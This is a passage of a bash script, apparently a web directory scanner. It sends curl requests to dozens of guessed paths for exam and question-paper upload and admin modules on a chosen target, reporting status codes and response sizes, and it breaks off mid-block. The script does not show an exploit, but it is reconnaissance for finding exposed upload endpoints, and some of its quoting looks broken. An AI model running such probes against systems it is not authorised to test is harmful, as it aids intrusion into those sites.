echo -n "Payload ["FileUpload-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
